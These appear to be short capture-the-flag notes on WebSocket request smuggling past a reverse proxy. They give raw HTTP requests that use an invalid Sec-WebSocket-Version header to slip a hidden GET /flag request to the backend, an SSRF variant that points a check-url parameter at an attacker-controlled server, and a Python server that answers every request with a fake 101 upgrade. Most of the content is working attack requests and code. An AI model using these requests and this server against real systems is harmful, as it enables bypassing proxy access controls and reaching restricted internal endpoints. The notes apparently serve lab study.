- Main headers to upgrade to websocket
```http
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: 03iqbEuwWluzcyko8CcGDQ==
```

- If there is a proxy between webserver and browser, then it is possible to connect to webserver directly by sending an incorrect socket upgrade request to avoid any access restrictions placed by the proxy

-  send an upgrade request with an invalid `Sec-Websocket-Version` header.
```http
Connection: Upgrade \r\n
Upgrade: websocket \r\n
Sec-WebSocket-Version: 777\r\n
Sec-WebSocket-Key: 03iqbEuwW1uzcyko8CcGDQ==\r\n
\r\n
```

Eg. 
```http
GET /socket HTTP/1.1
Host: MACHINE_IP:8001
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: MACHINE_IP:8001

```

- If we can somehow control the response from the webserver, then we can make the webserver return a successful websocket connection message to let the proxy know that websocket connection is successful

- Eg. request
```http

GET /check-url?server=http://10.10.11.155:5555 HTTP/1.1
Host: MACHINE_IP:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: MACHINE_IP:8002

```

- Attacker web server to return successful websocket upgrade for any request
```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()

```

